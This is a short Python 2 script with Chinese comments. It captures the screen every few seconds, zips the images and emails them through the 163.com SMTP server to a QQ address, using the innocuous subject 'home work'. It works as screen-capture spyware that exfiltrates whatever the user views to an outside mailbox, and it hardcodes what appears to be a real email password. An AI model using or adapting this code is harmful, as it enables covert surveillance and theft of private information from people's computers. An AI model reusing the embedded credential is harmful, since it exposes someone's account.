#encoding: utf8
import time
import os
import zipfile
from PIL import Image,ImageGrab
import smtplib
import mimetypes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
difScreenTime = 3  # 截屏间隔时间
numSendMail = 3 #截屏的数目
screenPath = 'C:/Users/lasclocker/Desktop/screen/'
zipFileName = 'pic.zip'
t1 = time.time()
if not os.path.exists(screenPath): #自动创建目录
    os.mkdir(screenPath)
def zipfun(): #压缩含有截屏图片的文件夹
    z = zipfile.ZipFile(zipFileName, 'w', zipfile.ZIP_DEFLATED)
    for dirpath, dirnames, filenames in os.walk(screenPath):
      for filename in filenames:
        z.write(os.path.join(dirpath, filename))
    z.close()
def AutoSendMail(): #把含有截屏图片的压缩包发送到指定的邮箱
    msg = MIMEMultipart()
    msg['From'] = "lasclocker@163.com"
    msg['To'] = "1139575827@qq.com"
    msg['Subject'] = "home work"
    txt = MIMEText("Hello,have a nice day!",'plain','gb2312')  
    msg.attach(txt)
    zipO = MIMEText(open(zipFileName,'rb').read(),'base64','utf-8')
    zipO["Content-Type"] = 'application/octet-stream' 
    zipO["Content-Disposition"] = 'attatchment;filename=%s'%(zipFileName) 
    msg.attach(zipO)
    server = smtplib.SMTP()
    server.connect('smtp.163.com','25') #notice: smtp
    server.login('lasclocker@163.com','15137011060lj@wx')
    server.sendmail(msg['From'],msg['To'],msg.as_string())
    server.quit()
def screen():
    im = ImageGrab.grab()
    w,h = im.size
    im = im.resize([w/2,h/2], Image.ANTIALIAS)
    im.save(screenPath + time.strftime('%Y%m%d%H%M%S') + '.jpg')
    print 'Save this screen Successfully！'
num = 0
while True:
    #print 'Wait for 10s...'
    if time.time() - t1 >= difScreenTime: #设定截屏时间间隔
        screen() #截屏
        num += 1
        if num >= numSendMail:
            zipfun() #压缩文件夹
            AutoSendMail() #发送邮件
            num = 0
            print 'send ok!'
            time.sleep(5)
        t1 = time.time()
